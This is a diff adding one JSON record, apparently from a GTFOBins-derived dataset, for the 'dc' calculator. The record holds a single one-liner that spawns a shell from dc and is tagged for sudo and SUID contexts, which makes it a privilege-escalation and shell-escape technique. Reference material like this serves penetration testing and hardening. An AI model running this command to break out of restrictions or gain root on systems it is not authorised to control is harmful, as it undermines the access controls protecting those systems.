@@ -1,0 +1,1 @@
+{"title": "dc", "source": "gtfobins", "source_label": "GTFOBins", "path": "dc", "html": "<h1>dc</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">dc -e &#x27;!/bin/sh&#x27;</code></pre>", "excerpt": "dc Shell dc -e &#x27;!/bin/sh&#x27;", "tags": ["func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}
